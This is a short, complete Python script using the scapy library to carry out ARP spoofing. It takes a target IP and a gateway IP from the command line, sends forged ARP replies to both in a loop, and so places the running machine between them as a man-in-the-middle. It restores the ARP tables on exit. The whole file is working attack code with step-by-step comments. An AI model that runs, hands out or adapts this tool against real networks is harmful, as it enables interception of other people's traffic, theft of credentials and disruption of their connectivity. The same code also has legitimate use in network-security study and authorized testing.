#!/usr/bin/python3

import scapy.all as scapy
import time
import optparse

# Function to handle command-line arguments
def arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="IP of the target machine")
    parser.add_option("-s", "--spoof", dest="spoof_ip", help="IP to spoof (usually the gateway IP)")
    (options, arguments) = parser.parse_args()

    # Validate user input
    if not options.target_ip or not options.spoof_ip:
        parser.error("[+] Please specify both target IP and spoof IP. For more help, use --help.")
    return options

# Function to get the MAC address of a given IP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    # Send ARP request and capture responses
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

# Function to perform ARP spoofing
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Function to restore ARP tables of target and gateway after ARP spoofing
def restore(dest_ip, source_ip):
    target_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)

# Get command-line arguments
options = arguments()

# Initialize packet counter
sent_packet = 0

try:
    while True:
        # Perform ARP spoofing between target and spoof IP
        spoof(options.target_ip, options.spoof_ip)
        spoof(options.spoof_ip, options.target_ip)

        # Increment the packet counter by 2 (for both target and spoof IP)
        sent_packet += 2

        # Display the number of sent packets on the same line
        print("\r[+] Sent packets: " + str(sent_packet), end="")

        # Wait for 2 seconds before sending the next set of packets
        time.sleep(2)

except KeyboardInterrupt:
    # User interrupted the program with Ctrl + C
    print("\n[*] Program terminating... Restoring ARP tables... Please wait...")
    # Restore ARP tables of target and gateway to original state
    restore(options.target_ip, options.spoof_ip)
    restore(options.spoof_ip, options.target_ip)
    print("... Program terminated ...")
